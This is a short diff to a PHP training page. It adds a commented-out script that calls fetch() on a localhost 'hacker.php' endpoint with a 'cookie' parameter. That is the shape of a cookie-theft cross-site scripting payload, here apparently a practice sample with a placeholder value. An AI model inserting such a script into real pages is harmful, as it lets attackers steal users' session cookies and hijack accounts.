@@ -83,5 +83,9 @@ if (!empty($_POST['submit'])) {
         </div>
     </div>
 
+    <!-- <script>
+        fetch(`http://localhost/workplace/training-php/configs/hacker.php?cookie=hihi`);
+    </script> -->
+
 </body>
 </html>
